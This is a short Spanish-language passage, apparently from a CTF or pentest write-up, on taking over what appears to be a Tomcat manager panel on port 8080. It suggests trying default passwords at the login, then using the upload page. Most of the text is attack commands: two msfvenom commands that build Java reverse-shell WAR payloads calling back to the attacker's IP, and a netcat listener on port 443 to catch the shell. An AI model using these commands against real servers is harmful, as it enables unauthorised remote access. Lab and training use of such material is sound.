está en el puerto 8080, cuando encuentres el panel de login, o pruebas con las contraseñas por defecto *(internet)* o le das a cancel para ver si ahí te sale.

Una ves dentro ubicas el sitio para subir archivos.

con **msfvenom** creamos 2 archivos:
```
msfvenom -p java/shell_reverse_tcp LHOST=<myIP> LPORT=443 -f war -o reverse1.war
```

```
msfvenom -p java/jsp_shell_tcp LHOST=<myIP> LPORT=443 -f war -o reverse2.war
```

Nos ponemos en escucha por el puerto 443
```
nc -nlvp 443
```

Subimos los archivos y probamos con cual funciona.